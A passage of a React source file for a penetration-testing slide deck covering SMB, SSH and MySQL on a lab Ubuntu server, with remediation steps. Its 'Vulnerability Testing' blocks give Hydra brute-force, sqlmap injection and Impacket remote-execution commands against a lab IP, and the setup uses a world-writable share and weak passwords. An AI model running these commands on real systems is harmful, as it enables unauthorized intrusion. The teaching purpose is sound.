          <div className="bg-blue-50 p-6 rounded-lg shadow-lg border-2 border-blue-300">
            <h3 className="text-2xl font-bold mb-4 text-blue-800">Installation</h3>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Ubuntu Server</p>
              <p>$ sudo apt install samba</p>
              <p>$ sudo systemctl start smbd</p>
              <p className="mt-3"># Configure share</p>
              <p>$ sudo mkdir /srv/samba/share</p>
              <p>$ sudo chmod 777 /srv/samba/share</p>
              <p className="mt-3"># Edit /etc/samba/smb.conf</p>
              <p>$ sudo smbpasswd -a username</p>
            </div>
          </div>

          <div className="bg-red-50 p-6 rounded-lg shadow-lg border-2 border-red-300">
            <h3 className="text-2xl font-bold mb-4 text-red-800">Vulnerability Testing</h3>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Kali Linux - Impacket</p>
              <p>$ smbclient -L //192.168.1.100 -N</p>
              <p className="mt-3"># Enumerate shares</p>
              <p>$ enum4linux -a 192.168.1.100</p>
              <p className="mt-3"># Impacket psexec</p>
              <p>$ psexec.py user:pass@192.168.1.100</p>
              <p className="mt-3"># Impacket smbexec</p>
              <p>$ smbexec.py domain/user@192.168.1.100</p>
            </div>
          </div>
        </div>

        <div className="max-w-6xl mx-auto space-y-6">
          <div className="bg-yellow-50 border-l-4 border-yellow-500 p-6">
            <h4 className="font-bold text-xl mb-3">🔍 Impacket Scripts Used</h4>
            <ul className="list-disc list-inside space-y-2 text-lg">
              <li><strong>psexec.py:</strong> Execute commands remotely via SMB</li>
              <li><strong>smbexec.py:</strong> Stealthier SMB-based command execution</li>
              <li><strong>wmiexec.py:</strong> Execute commands via WMI</li>
              <li><strong>secretsdump.py:</strong> Extract password hashes</li>
            </ul>
          </div>

          <div className="bg-green-50 border-l-4 border-green-500 p-6">
            <h4 className="font-bold text-xl mb-3">✅ Remediation</h4>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Disable SMBv1</p>
              <p>$ sudo nano /etc/samba/smb.conf</p>
              <p className="text-gray-500"># Add: min protocol = SMB2</p>
              <p className="mt-3"># Restrict access with firewall</p>
              <p>$ sudo ufw deny 445/tcp</p>
              <p className="mt-3"># Strong passwords and disable guest</p>
              <p>$ # Set map to guest = never in smb.conf</p>
            </div>
          </div>
        </div>
      </div>
    )
  },
  {
    id: 14,
    title: "Service 4: SSH Service",
    type: "content",
    content: (
      <div>
        <h2 className="text-5xl font-bold mb-8 text-center">Service 4: SSH Service</h2>

        <div className="grid grid-cols-2 gap-8 max-w-6xl mx-auto mb-8">
          <div className="bg-blue-50 p-6 rounded-lg shadow-lg border-2 border-blue-300">
            <h3 className="text-2xl font-bold mb-4 text-blue-800">Installation</h3>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Ubuntu Server</p>
              <p>$ sudo apt install openssh-server</p>
              <p>$ sudo systemctl start ssh</p>
              <p>$ sudo systemctl enable ssh</p>
              <p className="mt-3"># Verify service</p>
              <p>$ sudo systemctl status ssh</p>
              <p>$ sudo netstat -tulpn | grep :22</p>
            </div>
          </div>

          <div className="bg-red-50 p-6 rounded-lg shadow-lg border-2 border-red-300">
            <h3 className="text-2xl font-bold mb-4 text-red-800">Vulnerability Testing</h3>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Kali Linux - Nmap scan</p>
              <p>$ nmap -p 22 -sV 192.168.1.100</p>
              <p className="mt-3"># Brute force with Hydra</p>
              <p>$ hydra -l admin \\</p>
              <p className="ml-4">-P /usr/share/wordlists/rockyou.txt \\</p>
              <p className="ml-4">ssh://192.168.1.100</p>
              <p className="mt-3"># Check for weak configurations</p>
              <p>$ ssh-audit 192.168.1.100</p>
            </div>
          </div>
        </div>

        <div className="max-w-6xl mx-auto space-y-6">
          <div className="bg-yellow-50 border-l-4 border-yellow-500 p-6">
            <h4 className="font-bold text-xl mb-3">🔍 Common SSH Vulnerabilities</h4>
            <ul className="list-disc list-inside space-y-2 text-lg">
              <li>Weak or default passwords susceptible to brute force</li>
              <li>Root login enabled</li>
              <li>Password authentication instead of key-based</li>
              <li>Outdated SSH version with known CVEs</li>
            </ul>
          </div>

          <div className="bg-green-50 border-l-4 border-green-500 p-6">
            <h4 className="font-bold text-xl mb-3">✅ Remediation</h4>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Disable root login</p>
              <p>$ sudo nano /etc/ssh/sshd_config</p>
              <p className="text-gray-500"># Set: PermitRootLogin no</p>
              <p className="mt-3"># Use key-based authentication</p>
              <p className="text-gray-500"># Set: PasswordAuthentication no</p>
              <p className="mt-3"># Install fail2ban</p>
              <p>$ sudo apt install fail2ban</p>
              <p>$ sudo systemctl restart sshd</p>
            </div>
          </div>
        </div>
      </div>
    )
  },
  {
    id: 15,
    title: "Service 5: Database Services",
    type: "content",
    content: (
      <div>
        <h2 className="text-5xl font-bold mb-8 text-center">Service 5: Database Services (MySQL)</h2>

        <div className="grid grid-cols-2 gap-8 max-w-6xl mx-auto mb-8">
          <div className="bg-blue-50 p-6 rounded-lg shadow-lg border-2 border-blue-300">
            <h3 className="text-2xl font-bold mb-4 text-blue-800">Installation</h3>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Ubuntu Server</p>
              <p>$ sudo apt install mysql-server</p>
              <p>$ sudo systemctl start mysql</p>
              <p className="mt-3"># Create test database</p>
              <p>$ sudo mysql</p>
              <p>mysql&gt; CREATE DATABASE testdb;</p>
              <p>mysql&gt; CREATE USER 'testuser'@'%' \\</p>
              <p className="ml-6">IDENTIFIED BY 'password';</p>
              <p>mysql&gt; GRANT ALL ON testdb.* \\</p>
              <p className="ml-6">TO 'testuser'@'%';</p>
            </div>
          </div>

          <div className="bg-red-50 p-6 rounded-lg shadow-lg border-2 border-red-300">
            <h3 className="text-2xl font-bold mb-4 text-red-800">Vulnerability Testing</h3>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Kali Linux - Port scan</p>
              <p>$ nmap -p 3306 -sV 192.168.1.100</p>
              <p className="mt-3"># SQL injection with SQLMap</p>
              <p>$ sqlmap -u "http://target/page?id=1" \\</p>
              <p className="ml-4">--dbs --batch</p>
              <p className="mt-3"># Brute force MySQL</p>
              <p>$ hydra -l root -P passwords.txt \\</p>
              <p className="ml-4">mysql://192.168.1.100</p>
            </div>
          </div>
        </div>

        <div className="max-w-6xl mx-auto space-y-6">
          <div className="bg-yellow-50 border-l-4 border-yellow-500 p-6">
            <h4 className="font-bold text-xl mb-3">🔍 Database Security Testing</h4>
            <ul className="list-disc list-inside space-y-2 text-lg">
              <li>Test for SQL injection vulnerabilities</li>
              <li>Check for default credentials (root with no password)</li>
              <li>Verify remote access restrictions</li>
              <li>Enumerate database users and privileges</li>
            </ul>
          </div>

          <div className="bg-green-50 border-l-4 border-green-500 p-6">
            <h4 className="font-bold text-xl mb-3">✅ Remediation</h4>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Secure MySQL installation</p>
              <p>$ sudo mysql_secure_installation</p>
              <p className="mt-3"># Bind to localhost only</p>
              <p>$ sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf</p>
              <p className="text-gray-500"># Set: bind-address = 127.0.0.1</p>
              <p className="mt-3"># Use prepared statements in code</p>
              <p>$ # PDO or MySQLi with parameters</p>
            </div>
          </div>
        </div>
      </div>
    )
  },
  {
    id: 16,
    title: "Tools Summary",
    type: "content",
    content: (
      <div>
        <h2 className="text-5xl font-bold mb-12 text-center">Kali Linux Tools Summary</h2>

        <div className="grid grid-cols-2 gap-8 max-w-6xl mx-auto">
          <div className="space-y-6">
            <div className="bg-gradient-to-r from-blue-50 to-blue-100 p-6 rounded-lg shadow-lg border-2 border-blue-300">
              <h3 className="text-2xl font-bold mb-4 text-blue-800 flex items-center">
                <span className="bg-blue-600 text-white rounded-full w-10 h-10 flex items-center justify-center mr-3">1</span>
                Burp Collaborator
              </h3>
              <p className="text-lg mb-2"><strong>Purpose:</strong> Out-of-band vulnerability detection</p>
              <p className="text-lg mb-2"><strong>Use Case:</strong> SSRF, XXE, blind XSS detection</p>
              <p className="text-lg"><strong>Tested On:</strong> Web services</p>
            </div>

            <div className="bg-gradient-to-r from-purple-50 to-purple-100 p-6 rounded-lg shadow-lg border-2 border-purple-300">
              <h3 className="text-2xl font-bold mb-4 text-purple-800 flex items-center">
                <span className="bg-purple-600 text-white rounded-full w-10 h-10 flex items-center justify-center mr-3">2</span>
                Vega Scanner
              </h3>
              <p className="text-lg mb-2"><strong>Purpose:</strong> Automated web vulnerability scanner</p>
              <p className="text-lg mb-2"><strong>Use Case:</strong> XSS, SQLi, directory traversal</p>
              <p className="text-lg"><strong>Tested On:</strong> Apache web server</p>
            </div>

            <div className="bg-gradient-to-r from-green-50 to-green-100 p-6 rounded-lg shadow-lg border-2 border-green-300">
              <h3 className="text-2xl font-bold mb-4 text-green-800 flex items-center">
                <span className="bg-green-600 text-white rounded-full w-10 h-10 flex items-center justify-center mr-3">3</span>
                Censys
              </h3>
              <p className="text-lg mb-2"><strong>Purpose:</strong> Internet-wide asset discovery</p>
              <p className="text-lg mb-2"><strong>Use Case:</strong> Reconnaissance and enumeration</p>
              <p className="text-lg"><strong>Tested On:</strong> All external-facing services</p>
            </div>
          </div>

          <div className="space-y-6">
            <div className="bg-gradient-to-r from-orange-50 to-orange-100 p-6 rounded-lg shadow-lg border-2 border-orange-300">
              <h3 className="text-2xl font-bold mb-4 text-orange-800 flex items-center">
                <span className="bg-orange-600 text-white rounded-full w-10 h-10 flex items-center justify-center mr-3">4</span>
                EyeWitness
              </h3>
              <p className="text-lg mb-2"><strong>Purpose:</strong> Web service screenshot and identification</p>
              <p className="text-lg mb-2"><strong>Use Case:</strong> Visual reconnaissance, tech stack detection</p>
              <p className="text-lg"><strong>Tested On:</strong> Web services</p>
            </div>

            <div className="bg-gradient-to-r from-red-50 to-red-100 p-6 rounded-lg shadow-lg border-2 border-red-300">
              <h3 className="text-2xl font-bold mb-4 text-red-800 flex items-center">
                <span className="bg-red-600 text-white rounded-full w-10 h-10 flex items-center justify-center mr-3">5</span>
                Impacket Scripts
              </h3>
              <p className="text-lg mb-2"><strong>Purpose:</strong> SMB/Windows protocol exploitation</p>
              <p className="text-lg mb-2"><strong>Scripts Used:</strong> psexec.py, smbexec.py, wmiexec.py</p>
              <p className="text-lg"><strong>Tested On:</strong> SMB/CIFS shares</p>
            </div>

            <div className="bg-gradient-to-r from-indigo-50 to-indigo-100 p-6 rounded-lg shadow-lg border-2 border-indigo-300">
              <h3 className="text-2xl font-bold mb-4 text-indigo-800">Additional Tools</h3>
              <ul className="list-disc list-inside space-y-2 text-lg">
                <li><strong>Nmap:</strong> Port scanning</li>
                <li><strong>Hydra:</strong> Brute force attacks</li>
                <li><strong>SQLMap:</strong> SQL injection</li>
                <li><strong>Metasploit:</strong> Exploitation framework</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    )
  },
  {
    id: 17,
    title: "Key Takeaways",
    type: "content",
    content: (
      <div>
        <h2 className="text-5xl font-bold mb-12 text-center">Key Takeaways</h2>

        <div className="max-w-5xl mx-auto space-y-6">
          <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-8 rounded-xl shadow-lg border-2 border-blue-300">
            <h3 className="text-3xl font-bold mb-6 text-blue-800">🎯 Penetration Testing Process</h3>
            <ul className="list-disc list-inside space-y-3 text-xl">
              <li>Follow a structured 7-step methodology</li>
              <li>Document everything thoroughly for reporting</li>
              <li>Always get proper authorization before testing</li>
              <li>Verify remediation after fixing vulnerabilities</li>
            </ul>
          </div>

          <div className="bg-gradient-to-r from-green-50 to-emerald-50 p-8 rounded-xl shadow-lg border-2 border-green-300">
            <h3 className="text-3xl font-bold mb-6 text-green-800">🛡️ Defense in Depth</h3>
            <ul className="list-disc list-inside space-y-3 text-xl">
              <li>No single security measure is sufficient</li>
              <li>Implement multiple layers of protection</li>
              <li>Regular security audits and updates</li>
              <li>User education and awareness training</li>
            </ul>
          </div>

          <div className="bg-gradient-to-r from-purple-50 to-pink-50 p-8 rounded-xl shadow-lg border-2 border-purple-300">
            <h3 className="text-3xl font-bold mb-6 text-purple-800">🔧 Tools & Automation</h3>
            <ul className="list-disc list-inside space-y-3 text-xl">
              <li>Use specialized tools for efficiency</li>
              <li>Combine automated and manual testing</li>
              <li>Keep tools updated with latest signatures</li>
              <li>Understand tool limitations and false positives</li>
            </ul>
          </div>

          <div className="bg-gradient-to-r from-red-50 to-orange-50 p-8 rounded-xl shadow-lg border-2 border-red-300">
            <h3 className="text-3xl font-bold mb-6 text-red-800">⚖️ Legal & Ethical Considerations</h3>
            <ul className="list-disc list-inside space-y-3 text-xl">
              <li>Only test systems you have permission to test</li>
              <li>Follow rules of engagement strictly</li>
              <li>Maintain confidentiality of findings</li>
              <li>Report vulnerabilities responsibly</li>
            </ul>
          </div>
        </div>
      </div>
    )
  },
  {
    id: 18,
    title: "Conclusion",
    type: "content",
    content: (
      <div className="text-center">
        <Shield className="w-32 h-32 mx-auto mb-8 text-green-600" />
        <h1 className="text-7xl font-bold mb-8">Thank You</h1>
        <h2 className="text-4xl text-gray-600 mb-12">Questions?</h2>

        <div className="max-w-4xl mx-auto bg-gradient-to-r from-blue-50 to-indigo-50 p-10 rounded-2xl shadow-2xl border-4 border-blue-300">
          <h3 className="text-3xl font-bold mb-6 text-blue-800">Summary</h3>
          <div className="text-left space-y-4 text-xl">
            <p>✅ Covered all 7 steps of penetration testing</p>
            <p>✅ Demonstrated 5 service installations and testing</p>
            <p>✅ Utilized 5 Kali Linux tools (Burp, Vega, Censys, EyeWitness, Impacket)</p>
            <p>✅ Provided remediation techniques for all vulnerabilities</p>
            <p>✅ Complete testing environment: Kali Linux → Ubuntu Server</p>
          </div>

          <div className="mt-10 pt-8 border-t-2 border-blue-300">
            <p className="text-2xl font-bold text-gray-700">Remember: Security is a continuous process, not a one-time event!</p>
          </div>
        </div>
      </div>
    )
  }
];

export default function Home() {
  const [currentSlide, setCurrentSlide] = useState(0);

  const nextSlide = () => {
    if (currentSlide < slides.length - 1) {
      setCurrentSlide(currentSlide + 1);
    }
  };

  const prevSlide = () => {
    if (currentSlide > 0) {
      setCurrentSlide(currentSlide - 1);
    }
  };

  const goToSlide = (index: number) => {
    setCurrentSlide(index);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
      {/* Main Slide */}
      <div className="relative h-screen flex items-center justify-center p-8">
        <div className="w-full max-w-7xl">
          {slides[currentSlide].content}
        </div>

        {/* Navigation Controls */}
        <div className="fixed bottom-8 left-1/2 transform -translate-x-1/2 flex items-center space-x-4 bg-white/90 backdrop-blur-sm px-6 py-4 rounded-full shadow-xl border-2 border-gray-200">
          <button
            onClick={prevSlide}
            disabled={currentSlide === 0}
            className={`p-2 rounded-full transition-all ${
              currentSlide === 0
                ? 'bg-gray-200 text-gray-400 cursor-not-allowed'
                : 'bg-blue-600 text-white hover:bg-blue-700'
            }`}
          >
            <ChevronLeft className="w-6 h-6" />
          </button>

          <div className="flex items-center space-x-2">
            <span className="font-bold text-lg">{currentSlide + 1}</span>
            <span className="text-gray-400">/</span>
            <span className="text-gray-600">{slides.length}</span>
          </div>

          <button
            onClick={nextSlide}
            disabled={currentSlide === slides.length - 1}
            className={`p-2 rounded-full transition-all ${
              currentSlide === slides.length - 1
                ? 'bg-gray-200 text-gray-400 cursor-not-allowed'
                : 'bg-blue-600 text-white hover:bg-blue-700'
            }`}
          >
            <ChevronRight className="w-6 h-6" />
          </button>
        </div>

        {/* Slide Indicator Dots */}
        <div className="fixed bottom-24 left-1/2 transform -translate-x-1/2 flex space-x-2">
          {slides.map((_, index) => (
            <button
              key={index}
              onClick={() => goToSlide(index)}
              className={`w-3 h-3 rounded-full transition-all ${
                currentSlide === index
                  ? 'bg-blue-600 w-8'
                  : 'bg-gray-300 hover:bg-gray-400'
              }`}
            />
          ))}
        </div>

        {/* Slide Title Indicator */}
        <div className="fixed top-8 left-8 bg-white/90 backdrop-blur-sm px-6 py-3 rounded-lg shadow-lg border-2 border-gray-200">
          <p className="text-sm text-gray-500 mb-1">Current Slide</p>
          <p className="font-bold text-gray-800">{slides[currentSlide].title}</p>
        </div>

        {/* Keyboard Hints */}
        <div className="fixed top-8 right-8 bg-white/90 backdrop-blur-sm px-6 py-3 rounded-lg shadow-lg border-2 border-gray-200">
          <p className="text-sm text-gray-600">
            <kbd className="px-2 py-1 bg-gray-200 rounded text-xs mr-2">←</kbd>
            <kbd className="px-2 py-1 bg-gray-200 rounded text-xs">→</kbd>
            <span className="ml-2">to navigate</span>
          </p>
        </div>
      </div>
    </div>
  );
}
